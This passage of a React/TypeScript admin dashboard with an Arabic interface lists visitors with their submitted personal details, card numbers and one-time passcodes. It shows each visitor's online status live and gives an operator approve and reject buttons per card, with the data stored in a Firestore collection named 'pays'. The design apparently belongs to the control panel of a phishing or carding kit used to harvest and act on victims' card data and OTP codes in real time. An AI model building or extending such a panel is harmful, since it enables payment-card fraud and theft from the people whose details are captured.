      await signOut(auth)
      router.push("/login")
    } catch (error) {
      console.error("Error signing out:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تسجيل الخروج",
        variant: "destructive",
      })
    }
  }

  const handleInfoClick = (notification: Notification, infoType: "personal" | "card") => {
    setSelectedNotification(notification)
    setSelectedInfo(infoType)
  }

  const closeDialog = () => {
    setSelectedInfo(null)
    setSelectedNotification(null)
  }

  // Handle flag color change
  const handleFlagColorChange = async (id: string, color: FlagColor) => {
    try {
      // Update in Firestore
      const docRef = doc(db, "pays", id)
      await updateDoc(docRef, { flagColor: color })

      // Update local state
      setNotifications(
        notifications.map((notification) =>
          notification.id === id ? { ...notification, flagColor: color } : notification,
        ),
      )

      toast({
        title: "تم تحديث العلامة",
        description: color ? "تم تحديث لون العلامة بنجاح" : "تمت إزالة العلامة بنجاح",
        variant: "default",
      })
    } catch (error) {
      console.error("Error updating flag color:", error)
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء تحديث لون العلامة",
        variant: "destructive",
      })
    }
  }

  // Get row background color based on flag color
  const getRowBackgroundColor = (flagColor: FlagColor) => {
    if (!flagColor) return ""

    const colorMap = {
      red: "bg-red-50/50 dark:bg-red-950/20 hover:bg-red-50 dark:hover:bg-red-950/30 border-l-4 border-l-red-400",
      yellow:
        "bg-amber-50/50 dark:bg-amber-950/20 hover:bg-amber-50 dark:hover:bg-amber-950/30 border-l-4 border-l-amber-400",
      green:
        "bg-emerald-50/50 dark:bg-emerald-950/20 hover:bg-emerald-50 dark:hover:bg-emerald-950/30 border-l-4 border-l-emerald-400",
    }

    return colorMap[flagColor]
  }

  // Handle search
  const handleSearch = (term: string) => {
    setSearchTerm(term)
  }

  // Handle page change
  const handlePageChange = (page: number) => {
    setCurrentPage(page)
  }

  if (isLoading) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-slate-50 to-slate-100 dark:from-slate-900 dark:to-slate-800 flex items-center justify-center w-full">
        <div className="flex flex-col items-center gap-6">
          <div className="relative">
            <div className="h-16 w-16 animate-spin rounded-full border-4 border-blue-200 border-t-blue-600"></div>
            <div className="absolute inset-0 h-16 w-16 animate-pulse rounded-full bg-blue-100 opacity-20"></div>
          </div>
          <div className="text-center">
            <div className="text-xl font-bold text-slate-900 dark:text-slate-100 mb-2">جاري التحميل...</div>
            <div className="text-sm text-slate-600 dark:text-slate-400">يتم تحميل لوحة الإشعارات</div>
          </div>
        </div>
      </div>
    )
  }

  // Calculate counts for filter buttons
  const cardCount = notifications.filter((n) => n.cardNumber).length
  const onlineCount = Object.values(onlineStatuses).filter(Boolean).length

  // Sample data for mini charts
  const visitorTrend = [5, 8, 12, 7, 10, 15, 13, 18, 14, 12]
  const cardTrend = [2, 3, 5, 4, 6, 8, 7, 9, 8, 6]
  const onlineTrend = [3, 4, 6, 5, 7, 8, 6, 9, 7, 5]

  return (
    <div
      dir="rtl"
      className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-slate-100 dark:from-slate-900 dark:via-slate-800 dark:to-slate-900 text-slate-900 dark:text-slate-100"
    >
      {/* Mobile menu */}
      <Sheet open={mobileMenuOpen} onOpenChange={setMobileMenuOpen}>
        <SheetContent
          side="right"
          className="w-[280px] sm:w-[400px] bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700"
          dir="rtl"
        >
          <SheetHeader className="mb-8 border-b border-slate-200 dark:border-slate-700 pb-6">
            <SheetTitle className="flex items-center gap-3 text-xl font-bold">
              <div className="bg-blue-100 dark:bg-blue-900/30 p-2 rounded-lg">
                <Bell className="h-5 w-5 text-blue-600 dark:text-blue-400" />
              </div>
              <span>لوحة الإشعارات</span>
            </SheetTitle>
          </SheetHeader>
          <div className="space-y-8">
            <div className="flex items-center gap-4 p-4 bg-slate-50 dark:bg-slate-800/50 rounded-lg">
              <Avatar className="h-12 w-12 border-2 border-white dark:border-slate-700 shadow-sm">
                <AvatarImage src="/placeholder.svg?height=48&width=48" alt="صورة المستخدم" />
                <AvatarFallback className="bg-blue-100 dark:bg-blue-900/30 text-blue-600 dark:text-blue-400 font-bold">
                  مد
                </AvatarFallback>
              </Avatar>
              <div>
                <p className="font-semibold text-slate-900 dark:text-slate-100">مدير النظام</p>
                <p className="text-sm text-slate-600 dark:text-slate-400">admin@example.com</p>
              </div>
            </div>
            <Separator className="bg-slate-200 dark:bg-slate-700" />
            <nav className="space-y-2">
              <Button
                variant="ghost"
                className="w-full justify-start h-12 text-base"
                onClick={() => setMobileMenuOpen(false)}
              >
                <Bell className="mr-3 h-5 w-5" />
                الإشعارات
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start h-12 text-base"
                onClick={() => setSettingsOpen(true)}
              >
                <Settings className="mr-3 h-5 w-5" />
                الإعدادات
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start h-12 text-base"
                onClick={() => {
                  setExportDialogOpen(true)
                  setMobileMenuOpen(false)
                }}
              >
                <Download className="mr-3 h-5 w-5" />
                تصدير البيانات
              </Button>
              <Button
                variant="ghost"
                className="w-full justify-start h-12 text-base text-red-600 hover:text-red-700 hover:bg-red-50 dark:hover:bg-red-950/30"
                onClick={handleLogout}
              >
                <LogOut className="mr-3 h-5 w-5" />
                تسجيل الخروج
              </Button>
            </nav>
          </div>
        </SheetContent>
      </Sheet>

      {/* Settings panel */}
      <SettingsPanel open={settingsOpen} onOpenChange={setSettingsOpen} />

      {/* Export dialog */}
      <ExportDialog open={exportDialogOpen} onOpenChange={setExportDialogOpen} notifications={filteredNotifications} />

      <div className="mx-auto">
        {/* Header */}
        <header className="border-b border-slate-200/60 dark:border-slate-700/60 bg-white/80 dark:bg-slate-900/80 backdrop-blur-xl supports-[backdrop-filter]:bg-white/60 dark:supports-[backdrop-filter]:bg-slate-900/60 sticky top-0 z-50 shadow-sm">
          <div className="flex items-center justify-between p-4 lg:px-8">
            <div className="flex items-center gap-4">
              <Button
                variant="ghost"
                size="icon"
                className="md:hidden hover:bg-slate-100 dark:hover:bg-slate-800"
                onClick={() => setMobileMenuOpen(true)}
              >
                <Menu className="h-5 w-5" />
                <span className="sr-only">القائمة</span>
              </Button>
              <div className="flex items-center gap-4">
                <div className="bg-gradient-to-br from-blue-500 to-blue-600 p-3 rounded-xl shadow-lg">
                  <Bell className="h-6 w-6 text-white" />
                </div>
                <div className="hidden sm:block">
                  <h1 className="text-2xl font-bold bg-gradient-to-r from-slate-900 to-slate-700 dark:from-slate-100 dark:to-slate-300 bg-clip-text text-transparent">
                    لوحة الإشعارات
                  </h1>
                  <p className="text-sm text-slate-600 dark:text-slate-400 font-medium">إدارة ومراقبة الإشعارات</p>
                </div>
              </div>
            </div>

            <div className="flex items-center gap-3">
              <div className="hidden md:flex items-center gap-2">
                <TooltipProvider>
                  <Tooltip>
                    <TooltipTrigger asChild>
                      <Button
                        variant="outline"
                        size="icon"
                        onClick={() => setSettingsOpen(true)}
                        className="border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
                      >
                        <Settings className="h-4 w-4" />
                        <span className="sr-only">الإعدادات</span>
                      </Button>
                    </TooltipTrigger>
                    <TooltipContent>
                      <p>الإعدادات</p>
                    </TooltipContent>
                  </Tooltip>
                </TooltipProvider>

                <TooltipProvider>
                  <Tooltip>
                    <TooltipTrigger asChild>
                      <Button
                        variant="outline"
                        size="icon"
                        onClick={() => setExportDialogOpen(true)}
                        className="border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
                      >
                        <Download className="h-4 w-4" />
                        <span className="sr-only">تصدير</span>
                      </Button>
                    </TooltipTrigger>
                    <TooltipContent>
                      <p>تصدير البيانات</p>
                    </TooltipContent>
                  </Tooltip>
                </TooltipProvider>

                <Button
                  variant="outline"
                  onClick={handleClearAll}
                  disabled={notifications.length === 0}
                  className="hidden sm:flex items-center gap-2 border-red-200 text-red-600 hover:bg-red-50 hover:border-red-300 dark:border-red-800 dark:text-red-400 dark:hover:bg-red-950/30"
                >
                  <Trash2 className="h-4 w-4" />
                  مسح الكل
                </Button>
              </div>

              <DropdownMenu>
                <DropdownMenuTrigger asChild>
                  <Button
                    variant="ghost"
                    className="relative h-10 w-10 rounded-full hover:bg-slate-100 dark:hover:bg-slate-800"
                  >
                    <Avatar className="h-10 w-10 border-2 border-white dark:border-slate-700 shadow-sm">
                      <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
                      <AvatarFallback className="bg-blue-100 dark:bg-blue-900/30 text-blue-600 dark:text-blue-400 font-bold">
                        مد
                      </AvatarFallback>
                    </Avatar>
                  </Button>
                </DropdownMenuTrigger>
                <DropdownMenuContent
                  align="end"
                  className="w-64 bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700 shadow-xl"
                  alignOffset={8}
                >
                  <div className="flex items-center justify-start gap-3 p-4 border-b border-slate-200 dark:border-slate-700">
                    <Avatar className="h-10 w-10">
                      <AvatarImage src="/placeholder.svg?height=40&width=40" alt="صورة المستخدم" />
                      <AvatarFallback className="bg-blue-100 dark:bg-blue-900/30 text-blue-600 dark:text-blue-400 font-bold">
                        مد
                      </AvatarFallback>
                    </Avatar>
                    <div className="flex flex-col space-y-1 leading-none">
                      <p className="font-semibold text-sm text-slate-900 dark:text-slate-100">مدير النظام</p>
                      <p className="text-xs text-slate-600 dark:text-slate-400">admin@example.com</p>
                    </div>
                  </div>
                  <DropdownMenuItem
                    onClick={() => setSettingsOpen(true)}
                    className="p-3 cursor-pointer hover:bg-slate-50 dark:hover:bg-slate-800"
                  >
                    <Settings className="ml-3 h-4 w-4" />
                    <span>الإعدادات</span>
                  </DropdownMenuItem>
                  <DropdownMenuItem
                    onClick={handleLogout}
                    className="p-3 cursor-pointer hover:bg-red-50 dark:hover:bg-red-950/30 text-red-600 dark:text-red-400"
                  >
                    <LogOut className="ml-3 h-4 w-4" />
                    <span>تسجيل الخروج</span>
                  </DropdownMenuItem>
                </DropdownMenuContent>
              </DropdownMenu>
            </div>
          </div>
        </header>

        <div className="p-4 md:p-6 lg:p-8">
          {/* Statistics Grid */}
          <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
            {/* Online Users Card */}
            <Card className="bg-white dark:bg-slate-900 shadow-lg hover:shadow-xl transition-all duration-300 border-slate-200/60 dark:border-slate-700/60 overflow-hidden group">
              <CardHeader className="pb-3 bg-gradient-to-r from-blue-50 to-indigo-50 dark:from-blue-950/30 dark:to-indigo-950/30">
                <CardTitle className="text-sm text-slate-600 dark:text-slate-400 font-semibold flex items-center gap-2">
                  <UserCheck className="h-4 w-4 text-blue-600 dark:text-blue-400" />
                  المستخدمين المتصلين
                </CardTitle>
              </CardHeader>
              <CardContent className="pb-4">
                <div className="flex items-center justify-between mb-2">
                  <div className="flex items-center gap-4">
                    <div className="rounded-xl bg-gradient-to-br from-blue-500 to-blue-600 p-3 shadow-lg group-hover:shadow-xl transition-shadow duration-300">
                      <UserCheck className="h-6 w-6 text-white" />
                    </div>
                    <div className="text-3xl font-bold text-slate-900 dark:text-slate-100">{onlineUsersCount}</div>
                  </div>
                  <Badge
                    variant="outline"
                    className="bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800 font-semibold"
                  >
                    {Math.round((onlineUsersCount / totalVisitors) * 100) || 0}%
                  </Badge>
                </div>
                <div className="flex items-center gap-2 text-sm text-slate-600 dark:text-slate-400">
                  <TrendingUp className="h-4 w-4 text-emerald-500" />
                  <span>+12% من الأمس</span>
                </div>
              </CardContent>
              <CardFooter className="pt-0">
                <MiniChart data={onlineTrend} color="bg-blue-500" />
              </CardFooter>
            </Card>

            {/* Total Visitors Card */}
            <Card className="bg-white dark:bg-slate-900 shadow-lg hover:shadow-xl transition-all duration-300 border-slate-200/60 dark:border-slate-700/60 overflow-hidden group">
              <CardHeader className="pb-3 bg-gradient-to-r from-emerald-50 to-green-50 dark:from-emerald-950/30 dark:to-green-950/30">
                <CardTitle className="text-sm text-slate-600 dark:text-slate-400 font-semibold flex items-center gap-2">
                  <Users className="h-4 w-4 text-emerald-600 dark:text-emerald-400" />
                  إجمالي الزوار
                </CardTitle>
              </CardHeader>
              <CardContent className="pb-4">
                <div className="flex items-center justify-between mb-2">
                  <div className="flex items-center gap-4">
                    <div className="rounded-xl bg-gradient-to-br from-emerald-500 to-emerald-600 p-3 shadow-lg group-hover:shadow-xl transition-shadow duration-300">
                      <Users className="h-6 w-6 text-white" />
                    </div>
                    <div className="text-3xl font-bold text-slate-900 dark:text-slate-100">{totalVisitors}</div>
                  </div>
                  <Badge
                    variant="outline"
                    className="bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800 font-semibold"
                  >
                    +{visitorTrend[visitorTrend.length - 1] - visitorTrend[0]}
                  </Badge>
                </div>
                <div className="flex items-center gap-2 text-sm text-slate-600 dark:text-slate-400">
                  <TrendingUp className="h-4 w-4 text-emerald-500" />
                  <span>+8% من الأسبوع الماضي</span>
                </div>
              </CardContent>
              <CardFooter className="pt-0">
                <MiniChart data={visitorTrend} color="bg-emerald-500" />
              </CardFooter>
            </Card>

            {/* Card Submissions Card */}
            <Card className="bg-white dark:bg-slate-900 shadow-lg hover:shadow-xl transition-all duration-300 border-slate-200/60 dark:border-slate-700/60 overflow-hidden group">
              <CardHeader className="pb-3 bg-gradient-to-r from-purple-50 to-violet-50 dark:from-purple-950/30 dark:to-violet-950/30">
                <CardTitle className="text-sm text-slate-600 dark:text-slate-400 font-semibold flex items-center gap-2">
                  <CreditCard className="h-4 w-4 text-purple-600 dark:text-purple-400" />
                  معلومات البطاقات المقدمة
                </CardTitle>
              </CardHeader>
              <CardContent className="pb-4">
                <div className="flex items-center justify-between mb-2">
                  <div className="flex items-center gap-4">
                    <div className="rounded-xl bg-gradient-to-br from-purple-500 to-purple-600 p-3 shadow-lg group-hover:shadow-xl transition-shadow duration-300">
                      <CreditCard className="h-6 w-6 text-white" />
                    </div>
                    <div className="text-3xl font-bold text-slate-900 dark:text-slate-100">{cardSubmissions}</div>
                  </div>
                  <Badge
                    variant="outline"
                    className="bg-purple-50 text-purple-700 border-purple-200 dark:bg-purple-950/30 dark:text-purple-300 dark:border-purple-800 font-semibold"
                  >
                    {Math.round((cardSubmissions / totalVisitors) * 100) || 0}%
                  </Badge>
                </div>
                <div className="flex items-center gap-2 text-sm text-slate-600 dark:text-slate-400">
                  <TrendingUp className="h-4 w-4 text-emerald-500" />
                  <span>+15% من الأمس</span>
                </div>
              </CardContent>
              <CardFooter className="pt-0">
                <MiniChart data={cardTrend} color="bg-purple-500" />
              </CardFooter>
            </Card>
          </div>

          {/* Main content grid */}
          <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 mb-8">
            {/* Main content area - 2/3 width on large screens */}
            <div className="lg:col-span-3 space-y-8">
              {/* Tabs for Notifications and Statistics */}
              <Tabs defaultValue="notifications" className="w-full">
                <TabsList className="mb-6 bg-slate-100 dark:bg-slate-800 p-1 rounded-xl">
                  <TabsTrigger
                    value="notifications"
                    className="flex items-center gap-2 data-[state=active]:bg-white dark:data-[state=active]:bg-slate-700 data-[state=active]:shadow-sm rounded-lg px-4 py-2"
                  >
                    <Bell className="h-4 w-4" />
                    الإشعارات
                  </TabsTrigger>
                  <TabsTrigger
                    value="statistics"
                    className="flex items-center gap-2 data-[state=active]:bg-white dark:data-[state=active]:bg-slate-700 data-[state=active]:shadow-sm rounded-lg px-4 py-2"
                  >
                    <BarChart3 className="h-4 w-4" />
                    إحصائيات
                  </TabsTrigger>
                </TabsList>

                {/* Notifications Tab Content */}
                <TabsContent value="notifications" className="space-y-6 mt-0">
                  {/* Search and filters */}
                  <div className="flex flex-col sm:flex-row gap-4">
                    <div className="flex-1">
                      <SearchBar onSearch={handleSearch} />
                    </div>
                    <div className="flex gap-2">
                      <Button
                        variant={filterType === "all" ? "default" : "outline"}
                        onClick={() => setFilterType("all")}
                        className={`flex-1 sm:flex-none ${
                          filterType === "all"
                            ? "bg-blue-600 hover:bg-blue-700 text-white border-blue-600"
                            : "border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
                        }`}
                        size="sm"
                      >
                        الكل
                        <Badge variant="outline" className="mr-2 bg-white/20 text-current border-current/20">
                          {notifications.length}
                        </Badge>
                      </Button>
                      <Button
                        variant={filterType === "card" ? "default" : "outline"}
                        onClick={() => setFilterType("card")}
                        className={`flex-1 sm:flex-none ${
                          filterType === "card"
                            ? "bg-blue-600 hover:bg-blue-700 text-white border-blue-600"
                            : "border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
                        }`}
                        size="sm"
                      >
                        <CreditCard className="h-4 w-4 ml-1" />
                        البطاقات
                        <Badge variant="outline" className="mr-2 bg-white/20 text-current border-current/20">
                          {cardCount}
                        </Badge>
                      </Button>
                      <Button
                        variant={filterType === "online" ? "default" : "outline"}
                        onClick={() => setFilterType("online")}
                        className={`flex-1 sm:flex-none ${
                          filterType === "online"
                            ? "bg-blue-600 hover:bg-blue-700 text-white border-blue-600"
                            : "border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-800"
                        }`}
                        size="sm"
                      >
                        <UserCheck className="h-4 w-4 ml-1" />
                        المتصلين
                        <Badge variant="outline" className="mr-2 bg-white/20 text-current border-current/20">
                          {onlineCount}
                        </Badge>
                      </Button>
                    </div>
                  </div>

                  {/* Notifications Table */}
                  <Card className="bg-white dark:bg-slate-900 shadow-lg border-slate-200/60 dark:border-slate-700/60 overflow-hidden">
                    <CardHeader className="py-4 px-6 flex flex-row items-center justify-between border-b border-slate-200/60 dark:border-slate-700/60 bg-slate-50/50 dark:bg-slate-800/50">
                      <CardTitle className="text-xl font-bold flex items-center gap-3 text-slate-900 dark:text-slate-100">
                        <div className="bg-blue-100 dark:bg-blue-900/30 p-2 rounded-lg">
                          <Bell className="h-5 w-5 text-blue-600 dark:text-blue-400" />
                        </div>
                        الإشعارات
                        {searchTerm && (
                          <Badge
                            variant="outline"
                            className="mr-2 bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800"
                          >
                            نتائج البحث: {filteredNotifications.length}
                          </Badge>
                        )}
                      </CardTitle>
                      <div className="flex items-center gap-2">
                        <DropdownMenu>
                          <DropdownMenuTrigger asChild>
                            <Button
                              variant="ghost"
                              size="sm"
                              className="h-9 gap-2 hover:bg-slate-100 dark:hover:bg-slate-800"
                            >
                              <ArrowUpDown className="h-4 w-4" />
                              <span className="sr-only md:not-sr-only md:inline-block">ترتيب</span>
                            </Button>
                          </DropdownMenuTrigger>
                          <DropdownMenuContent
                            align="end"
                            className="w-48 bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700"
                          >
                            <DropdownMenuItem className="cursor-pointer">الأحدث أولاً</DropdownMenuItem>
                            <DropdownMenuItem className="cursor-pointer">الأقدم أولاً</DropdownMenuItem>
                            <DropdownMenuItem className="cursor-pointer">حسب الدولة</DropdownMenuItem>
                            <DropdownMenuItem className="cursor-pointer">حسب الحالة</DropdownMenuItem>
                          </DropdownMenuContent>
                        </DropdownMenu>
                        <Button
                          variant="ghost"
                          size="sm"
                          className="h-9 hover:bg-slate-100 dark:hover:bg-slate-800"
                          onClick={() => setExportDialogOpen(true)}
                        >
                          <Download className="h-4 w-4 mr-1" />
                          <span className="sr-only md:not-sr-only md:inline-block">تصدير</span>
                        </Button>
                      </div>
                    </CardHeader>

                    {/* Desktop Table View - Hidden on Mobile */}
                    <div className="hidden md:block overflow-x-auto">
                      <table className="w-full">
                        <thead>
                          <tr className="border-b border-slate-200/60 dark:border-slate-700/60 bg-slate-50/80 dark:bg-slate-800/50">
                            <th className="px-6 py-4 text-right font-semibold text-slate-700 dark:text-slate-300">
                              الدولة
                            </th>
                            <th className="px-6 py-4 text-right font-semibold text-slate-700 dark:text-slate-300">
                              المعلومات
                            </th>
                            <th className="px-6 py-4 text-right font-semibold text-slate-700 dark:text-slate-300">
                              حالة البطاقة
                            </th>
                            <th className="px-6 py-4 text-right font-semibold text-slate-700 dark:text-slate-300">
                              الوقت
                            </th>
                            <th className="px-6 py-4 text-center font-semibold text-slate-700 dark:text-slate-300">
                              الحالة
                            </th>
                            <th className="px-6 py-4 text-center font-semibold text-slate-700 dark:text-slate-300">
                              كود
                            </th>
                            <th className="px-6 py-4 text-center font-semibold text-slate-700 dark:text-slate-300">
                              الإجراءات
                            </th>
                          </tr>
                        </thead>
                        <tbody>
                          {paginatedNotifications.map((notification) => (
                            <tr
                              key={notification.id}
                              className={`border-b border-slate-200/40 dark:border-slate-700/40 ${getRowBackgroundColor(notification?.flagColor!)} transition-all duration-200 hover:bg-slate-50/50 dark:hover:bg-slate-800/50`}
                            >
                              <td className="px-6 py-4">
                                <div className="flex items-center gap-3">
                                  <div className="bg-slate-100 dark:bg-slate-800 p-2 rounded-lg">
                                    <MapPin className="h-4 w-4 text-slate-600 dark:text-slate-400" />
                                  </div>
                                  <span className="font-medium text-slate-900 dark:text-slate-100">
                                    {notification.country || "غير معروف"}
                                  </span>
                                </div>
                              </td>
                              <td className="px-6 py-4">
                                <div className="flex flex-wrap gap-2">
                                  <Badge
                                    variant={notification?.phone ? "secondary" : "destructive"}
                                    className={`rounded-lg cursor-pointer transition-all duration-200 ${
                                      notification?.phone
                                        ? "bg-blue-50 text-blue-700 border-blue-200 hover:bg-blue-100 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800 dark:hover:bg-blue-900/50"
                                        : "bg-red-50 text-red-700 border-red-200 hover:bg-red-100 dark:bg-red-950/30 dark:text-red-300 dark:border-red-800 dark:hover:bg-red-900/50"
                                    }`}
                                    onClick={() => handleInfoClick(notification, "personal")}
                                  >
                                    {notification?.phone ? "معلومات شخصية" : "لا يوجد معلومات"}
                                  </Badge>
                                  <Badge
                                    variant={notification.cardNumber ? "secondary" : "destructive"}
                                    className={`rounded-lg cursor-pointer transition-all duration-200 ${
                                      notification.cardNumber
                                        ? "bg-emerald-50 text-emerald-700 border-emerald-200 hover:bg-emerald-100 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800 dark:hover:bg-emerald-900/50"
                                        : "bg-red-50 text-red-700 border-red-200 hover:bg-red-100 dark:bg-red-950/30 dark:text-red-300 dark:border-red-800 dark:hover:bg-red-900/50"
                                    }`}
                                    onClick={() => handleInfoClick(notification, "card")}
                                  >
                                    {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                  </Badge>
                                </div>
                              </td>
                              <td className="px-6 py-4">
                                {notification.status === "approved" ? (
                                  <Badge className="bg-emerald-50 text-emerald-700 border-emerald-200 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800 font-medium">
                                    <CheckCircle className="h-3 w-3 mr-1" />
                                    موافق
                                  </Badge>
                                ) : notification.status === "rejected" ? (
                                  <Badge className="bg-red-50 text-red-700 border-red-200 dark:bg-red-950/30 dark:text-red-300 dark:border-red-800 font-medium">
                                    <XCircle className="h-3 w-3 mr-1" />
                                    مرفوض
                                  </Badge>
                                ) : (
                                  <Badge
                                    variant="outline"
                                    className="bg-amber-50 text-amber-700 border-amber-200 dark:bg-amber-950/30 dark:text-amber-300 dark:border-amber-800 font-medium"
                                  >
                                    <Clock className="h-3 w-3 mr-1" />
                                    معلق
                                  </Badge>
                                )}
                              </td>
                              <td className="px-6 py-4 whitespace-nowrap">
                                <div className="flex items-center gap-3">
                                  <div className="bg-slate-100 dark:bg-slate-800 p-1.5 rounded-lg">
                                    <Clock className="h-3 w-3 text-slate-600 dark:text-slate-400" />
                                  </div>
                                  <span className="text-sm text-slate-600 dark:text-slate-400 font-medium">
                                    {notification.createdDate &&
                                      formatDistanceToNow(new Date(notification.createdDate), {
                                        addSuffix: true,
                                        locale: ar,
                                      })}
                                  </span>
                                </div>
                              </td>
                              <td className="px-6 py-4 text-center">
                                <UserStatus userId={notification.id} />
                              </td>
                              <td className="px-6 py-4 text-center">
                                {notification.otp && (
                                  <Badge
                                    className="bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800 font-mono font-semibold"
                                    variant="outline"
                                  >
                                    {notification.otp}
                                  </Badge>
                                )}
                              </td>
                              <td className="px-6 py-4">
                                <div className="flex justify-center gap-1">
                                  <TooltipProvider>
                                    <Tooltip>
                                      <TooltipTrigger asChild>
                                        <Button
                                          variant="outline"
                                          size="sm"
                                          onClick={() => handleApproval("approved", notification.id)}
                                          className="bg-emerald-50 border-emerald-200 text-emerald-700 hover:bg-emerald-100 dark:bg-emerald-950/30 dark:border-emerald-800 dark:text-emerald-300 dark:hover:bg-emerald-900/50"
                                          disabled={notification.status === "approved"}
                                        >
                                          <CheckCircle className="h-4 w-4" />
                                        </Button>
                                      </TooltipTrigger>
                                      <TooltipContent>
                                        <p>قبول</p>
                                      </TooltipContent>
                                    </Tooltip>
                                  </TooltipProvider>

                                  <TooltipProvider>
                                    <Tooltip>
                                      <TooltipTrigger asChild>
                                        <Button
                                          variant="outline"
                                          size="sm"
                                          onClick={() => handleApproval("rejected", notification.id)}
                                          className="bg-red-50 border-red-200 text-red-700 hover:bg-red-100 dark:bg-red-950/30 dark:border-red-800 dark:text-red-300 dark:hover:bg-red-900/50"
                                          disabled={notification.status === "rejected"}
                                        >
                                          <XCircle className="h-4 w-4" />
                                        </Button>
                                      </TooltipTrigger>
                                      <TooltipContent>
                                        <p>رفض</p>
                                      </TooltipContent>
                                    </Tooltip>
                                  </TooltipProvider>

                                  <FlagColorSelector
                                    notificationId={notification.id}
                                    currentColor={notification.flagColor || null}
                                    onColorChange={handleFlagColorChange}
                                  />

                                  <TooltipProvider>
                                    <Tooltip>
                                      <TooltipTrigger asChild>
                                        <Button
                                          variant="ghost"
                                          size="sm"
                                          onClick={() => handleDelete(notification.id)}
                                          className="text-red-500 dark:text-red-400 hover:text-red-600 dark:hover:text-red-300 hover:bg-red-50 dark:hover:bg-red-950/30"
                                        >
                                          <Trash2 className="h-4 w-4" />
                                        </Button>
                                      </TooltipTrigger>
                                      <TooltipContent>
                                        <p>حذف</p>
                                      </TooltipContent>
                                    </Tooltip>
                                  </TooltipProvider>
                                </div>
                              </td>
                            </tr>
                          ))}
                          {paginatedNotifications.length === 0 && (
                            <tr>
                              <td colSpan={7} className="px-6 py-12 text-center">
                                <div className="flex flex-col items-center gap-4">
                                  <div className="bg-slate-100 dark:bg-slate-800 rounded-full p-4">
                                    <Bell className="h-8 w-8 text-slate-400" />
                                  </div>
                                  <div>
                                    <p className="text-lg font-semibold text-slate-900 dark:text-slate-100 mb-1">
                                      لا توجد إشعارات
                                    </p>
                                    <p className="text-slate-600 dark:text-slate-400">
                                      لا توجد إشعارات متطابقة مع الفلتر المحدد
                                    </p>
                                  </div>
                                </div>
                              </td>
                            </tr>
                          )}
                        </tbody>
                      </table>
                    </div>

                    {/* Mobile Card View - Shown only on Mobile */}
                    <div className="md:hidden space-y-4 p-4">
                      {paginatedNotifications.length > 0 ? (
                        paginatedNotifications.map((notification) => (
                          <Card
                            key={notification.id}
                            className={`overflow-hidden bg-white dark:bg-slate-900 border-slate-200 dark:border-slate-700 shadow-sm hover:shadow-md transition-all duration-200 ${getRowBackgroundColor(notification?.flagColor!)} mb-4`}
                          >
                            <CardHeader className="p-4 pb-2">
                              <div className="flex justify-between items-start">
                                <div className="flex items-center gap-3">
                                  <div className="bg-slate-100 dark:bg-slate-800 p-2 rounded-lg">
                                    <MapPin className="h-4 w-4 text-slate-600 dark:text-slate-400" />
                                  </div>
                                  <span className="font-semibold text-slate-900 dark:text-slate-100">
                                    {notification.country || "غير معروف"}
                                  </span>
                                </div>
                                <div className="flex items-center gap-2">
                                  {notification.otp && (
                                    <Badge
                                      className="bg-blue-50 text-blue-700 border-blue-200 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800 font-mono"
                                      variant="outline"
                                    >
                                      {notification.otp}
                                    </Badge>
                                  )}
                                  <UserStatus userId={notification.id} />
                                </div>
                              </div>
                            </CardHeader>
                            <CardContent className="p-4 pt-2">
                              <div className="grid grid-cols-1 gap-4 mb-4">
                                <div className="flex flex-wrap gap-2 mb-3">
                                  <Badge
                                    variant={notification?.phone ? "secondary" : "destructive"}
                                    className={`rounded-lg cursor-pointer transition-all duration-200 ${
                                      notification?.phone
                                        ? "bg-blue-50 text-blue-700 border-blue-200 hover:bg-blue-100 dark:bg-blue-950/30 dark:text-blue-300 dark:border-blue-800"
                                        : "bg-red-50 text-red-700 border-red-200 hover:bg-red-100 dark:bg-red-950/30 dark:text-red-300 dark:border-red-800"
                                    }`}
                                    onClick={() => handleInfoClick(notification, "personal")}
                                  >
                                    {notification.name ? "معلومات شخصية" : "لا يوجد معلومات"}
                                  </Badge>
                                  <Badge
                                    variant={notification.cardNumber ? "secondary" : "destructive"}
                                    className={`rounded-lg cursor-pointer transition-all duration-200 ${
                                      notification.cardNumber
                                        ? "bg-emerald-50 text-emerald-700 border-emerald-200 hover:bg-emerald-100 dark:bg-emerald-950/30 dark:text-emerald-300 dark:border-emerald-800"
                                        : "bg-red-50 text-red-700 border-red-200 hover:bg-red-100 dark:bg-red-950/30 dark:text-red-300 dark:border-red-800"
                                    }`}
                                    onClick={() => handleInfoClick(notification, "card")}
                                  >
                                    {notification.cardNumber ? "معلومات البطاقة" : "لا يوجد بطاقة"}
                                  </Badge>
                                </div>

                                <div className="flex justify-between items-center py-3 border-t border-slate-200/60 dark:border-slate-700/60">
                                  <div className="flex items-center gap-2">
                                    <span className="text-sm font-medium text-slate-600 dark:text-slate-400">
                                      الحالة:
                                    </span>
                                    {notification.status === "approved" ? (
